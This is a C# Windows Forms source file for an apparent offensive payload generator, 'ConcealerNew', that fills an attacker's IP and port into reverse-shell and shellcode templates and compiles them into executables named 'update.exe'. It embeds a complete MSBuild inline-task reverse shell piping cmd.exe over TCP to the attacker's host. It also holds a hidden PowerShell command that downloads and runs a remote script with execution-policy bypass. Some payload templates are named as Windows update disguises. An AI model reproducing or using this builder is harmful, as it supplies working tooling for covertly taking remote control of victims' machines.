/*
 * Author : Diljith Suresh
 * Github : https://github.com/diljithishere
 * Initial Submission : 18th January 2019
 * To Do : A lot :)
 */

using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace ConcealerNew
{
    public partial class ConcealerForm : Form
    {
        private TreeNode curnode;
        private string outpath;

        public ConcealerForm()
        {
            InitializeComponent();
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void trvSelect_AfterSelect(object sender, TreeViewEventArgs e)
        {
            curnode = trvSelect.SelectedNode;
            pnlbuttons.Visible = pnlfortxtrhost.Visible = curnode.Name.ToLower() == "trvitemnormal" || curnode.Name.ToLower() == "trviteminline" || curnode.Name.ToLower() == "trvitemmsbuild" || curnode.Name.ToLower() == "trvitempsnormalrevshell";
            pnlbuttons.Location = new System.Drawing.Point(183, 116);

            pnlshellcode.Visible = curnode.Name.ToLower() == "trvitembinary";
            if (curnode.Name.ToLower() == "trvitembinary")
            {
                pnlbuttons.Visible = true;
                pnlshellcode.Location = new System.Drawing.Point(184, 40);
                pnlshellcode.Size = new System.Drawing.Size(358, 320);
                pnlbuttons.Location = new System.Drawing.Point(183, 380);

            }


        }


        private void btnconsole_Click(object sender, EventArgs e)
        {
            updatetemplate(false);
            btnshowfile.Enabled = true;
        }


        private void updatemsbuild()
        {
            string buildval = @"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
                                <Target Name = ""tdu"">
                                <tdu/>
                                </Target>
                                <UsingTask
                                TaskName = ""tdu""
                                TaskFactory = ""CodeTaskFactory""
                                AssemblyFile = ""C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"">
                                <Task>


                                <Reference Include = ""System.Management.Automation""/> 
                                <Code Type = ""Class"" Language = ""cs"">
    
                                <![CDATA[
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Net.Sockets;
            using System.Text;
            using System.Management.Automation;
            using System.Management.Automation.Runspaces;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;
            using System.Collections.ObjectModel;
            public class tdu : Task, ITask
        {
            public static StreamWriter streamWriter;
            public static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                StringBuilder strOutput = new StringBuilder();
                if (!String.IsNullOrEmpty(outLine.Data))
                {
                    try
                    {
                        strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                    }
                    catch (Exception ex) { throw ex; }
                }
            }
            public override bool Execute()
            {
                using (TcpClient client = new TcpClient(""IPHERE"", PORTHERE))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();
                            Process p = new Process();
                            p.StartInfo.FileName = ""cmd.exe"";
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            while (true)
                            {
                                strInput.Append(rdr.ReadLine());
                                p.StandardInput.WriteLine(strInput);
                                strInput.Remove(0, strInput.Length);
                            }
                        }
                    }
                }
            }

        }
         ]]>
        </Code>      
      </Task>
</UsingTask>
</Project>";
            buildval = buildval.Replace("IPHERE", txtrhost.Text);
            buildval = buildval.Replace("PORTHERE", txtrport.Text);
            string msbuildpath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe";

            using (StreamWriter sw = new StreamWriter(@"C:\Windows\Temp\tdu.xml"))
            {
                sw.Write(buildval);
            }
            Process p = new Process();
            p.StartInfo.FileName = msbuildpath;
            p.StartInfo.Arguments = @"C:\Windows\Temp\tdu.xml";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.Verb = "runas";
            p.Start();
            p.WaitForExit();

        }

        private void updatetemplate(bool isGUI)
        {
            string line;
            //string path = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"templates\NormalRevShell.txt");
            //string outpath = Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), @"OutFiles\NormalRevShell.cs");
            string path, pspath = string.Empty;
            path = string.Empty;
            if (!isGUI)
            {
                //curnode.Name.ToLower() == "trvitemnormal" || curnode.Name.ToLower() == "trviteminline" || curnode.Name.ToLower() == "trvitemmsbuild";
                if (curnode.Name.ToLower() == "trvitemmsbuild") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\msbuild.txt"); }
                else if (curnode.Name.ToLower() == "trvitemnormal") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\NormalRevShell.txt"); }
                else if (curnode.Name.ToLower() == "trviteminline") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\InLineRevShell.txt"); }
                else if (curnode.Name.ToLower() == "trvitembinary") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\shelllaunchconsole.txt"); }
                else if (curnode.Name.ToLower() == "trvitempsnormalrevshell") {
                    path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\psrevshell.txt");
                    pspath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\PSNormal.txt");
                }

            }
            else
            {
                if (curnode.Name.ToLower() == "trvitemmsbuild") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\WinUpdatemsbuild.txt"); }
                else if (curnode.Name.ToLower() == "trvitemnormal") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\WinUpdateNormalRevShell.txt"); }
                else if (curnode.Name.ToLower() == "trviteminline") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\WinUpdateinline.txt"); }
                else if (curnode.Name.ToLower() == "trvitembinary") { path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\WinUpdateShellLaunch.txt"); }
                else if (curnode.Name.ToLower() == "trvitempsnormalrevshell")
                {
                    path = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\psrevshell.txt");
                    pspath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"templates\WinUpdatePSNormalRevShell.txt");
                }
            }
            if (curnode.Name.ToLower() == "trvitempsnormalrevshell")
            {
               
                    makepsfile(path);
            }
            outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"OutFiles\myfile.cs");

           
                using (StreamWriter sw = new StreamWriter(outpath))
                {

                    try
                    {
                        //Pass the file path and file name to the StreamReader constructor
                        if(!string.IsNullOrEmpty(pspath))
                    {
                        path = pspath;
                    }
                        using (StreamReader sr = new StreamReader(path))
                        {

                            //Read the first line of text
                            line = sr.ReadLine();
                            if (line.Contains("SHELLHERE"))
                            {
                                line = line.Replace("SHELLHERE", rtxtshellcode.Text);
                            }
                            else if (line.Contains("IPHERE"))
                            {
                                line = line.Replace("IPHERE", txtrhost.Text);
                                line = line.Replace("PORTHERE", txtrport.Text);
                            }
                        else if (line.Contains("PORTHERE"))
                        {
                            line = line.Replace("PORTHERE", txtrport.Text);
                        }
                        else if (line.Contains("SERVERIP"))
                            {
                                line = line.Replace("SERVERIP", txtrhost.Text);
                            }
                            sw.WriteLine(line);
                            //Continue to read until you reach end of file
                            while (line != null)
                            {
                                //write the lie to console window
                                //Read the next line
                                line = sr.ReadLine();
                                if (line.Contains("SHELLHERE"))
                                {
                                    line = line.Replace("SHELLHERE", rtxtshellcode.Text);
                                }
                                else if (line.Contains("IPHERE"))
                                {
                                    line = line.Replace("IPHERE", txtrhost.Text);
                                    line = line.Replace("PORTHERE", txtrport.Text);
                                }
                            else if (line.Contains("PORTHERE"))
                            {
                                line = line.Replace("PORTHERE", txtrport.Text);
                            }
                            else if (line.Contains("SERVERIP"))
                                {
                                    line = line.Replace("SERVERIP", txtrhost.Text);
                                }
                                sw.WriteLine(line);

                            }
                            //sw.Close();


                            //close the file
                        }
                    }
                    catch { }

                

            }

            //string renamefile = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"OutFiles\newfile.cs");
            //File.Move(outpath, renamefile);
            BuildExe(outpath, isGUI);
            File.Delete(outpath);
        }

        private void makepsfile(string path)
        {
            string line;

            outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"OutFiles\ps_shell.ps1");


            using (StreamWriter sw = new StreamWriter(outpath))
            {

                try
                {
                    //Pass the file path and file name to the StreamReader constructor
                    using (StreamReader sr = new StreamReader(path))
                    {

                        //Read the first line of text
                        line = sr.ReadLine();
                        if (line.Contains("SHELLHERE"))
                        {
                            line = line.Replace("SHELLHERE", rtxtshellcode.Text);
                        }
                        else if (line.Contains("IPHERE"))
                        {
                            line = line.Replace("IPHERE", txtrhost.Text);
                            line = line.Replace("PORTHERE", txtrport.Text);
                        }
                        else if (line.Contains("PORTHERE"))
                        {
                            line = line.Replace("PORTHERE", txtrport.Text);
                        }
                        else if (line.Contains("SERVERIP"))
                        {
                            line = line.Replace("SERVERIP", txtrhost.Text);
                        }
                        sw.WriteLine(line);
                        //Continue to read until you reach end of file
                        while (line != null)
                        {
                            //write the lie to console window
                            //Read the next line
                            line = sr.ReadLine();
                            if (line.Contains("SHELLHERE"))
                            {
                                line = line.Replace("SHELLHERE", rtxtshellcode.Text);
                            }
                            else if (line.Contains("IPHERE"))
                            {
                                line = line.Replace("IPHERE", txtrhost.Text);
                                line = line.Replace("PORTHERE", txtrport.Text);
                            }
                            else if (line.Contains("PORTHERE"))
                            {
                                line = line.Replace("PORTHERE", txtrport.Text);
                            }
                            else if (line.Contains("SERVERIP"))
                            {
                                line = line.Replace("SERVERIP", txtrhost.Text);
                            }
                            sw.WriteLine(line);

                        }
                        //sw.Close();


                        //close the file
                    }
                }
                catch { }



            }
        }

        private void runpsrevshell(string filename, bool isGui)
        {
            Process p = new Process();
            if (IntPtr.Size == 8)
            {
                p.StartInfo.FileName = @"c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe";

            }
            else
            {
                p.StartInfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0>powershell.exe";
            }

            if (!isGui)
            {
                p.StartInfo.Arguments = "-w hidden -ep bypass -nop -c " + "IEX((new- object net.webclient).downloadstring(\'http://SERVERIP/outfiles/revpshell.ps1\'))" + filename;
            }
            else
            {
                p.StartInfo.Arguments = "/target:winexe " + "-out:" + Directory.GetParent(filename).FullName + @"\file.exe" + " " + filename;

            }
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.Verb = "runas";
            p.Start();
            p.WaitForExit();

        }

        private void BuildExe(string filename, bool isGui)
        {
            Process p = new Process();
            //p.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe";
            p.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
            if (!isGui)
            {
                p.StartInfo.Arguments = "-out:" + Directory.GetParent(filename).FullName + @"\update.exe" + " " + filename;
            }
            else
            {
                p.StartInfo.Arguments = "/target:winexe " + "-out:" + Directory.GetParent(filename).FullName + @"\update.exe" + " " + filename;

            }
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.Verb = "runas";
            p.Start();
            p.WaitForExit();
            /* ProcessStartInfo pinfo = new ProcessStartInfo();
             pinfo.CreateNoWindow = false;
             pinfo.UseShellExecute = false;
             pinfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe";
             pinfo.WindowStyle = ProcessWindowStyle.Hidden;
             pinfo.Arguments = filename;

             try
             {
                 // Start the process with the info we specified.
                 // Call WaitForExit and then the using statement will close.
                 using (Process exeProcess = Process.Start(pinfo))
                 {
                     exeProcess.WaitForExit();
                 }
             }
             catch
             {
                 // Log error.
             }*/

        }

        private void btnshowfile_Click(object sender, EventArgs e)
        {
            Process.Start(new System.Diagnostics.ProcessStartInfo()
            {
                FileName = Directory.GetParent(outpath).FullName,
                UseShellExecute = true,
                Verb = "open"
            });

            btnshowfile.Enabled = false;
        }

        private void btngui_Click(object sender, EventArgs e)
        {
            updatetemplate(true);
            btnshowfile.Enabled = true;
        }
    }
}
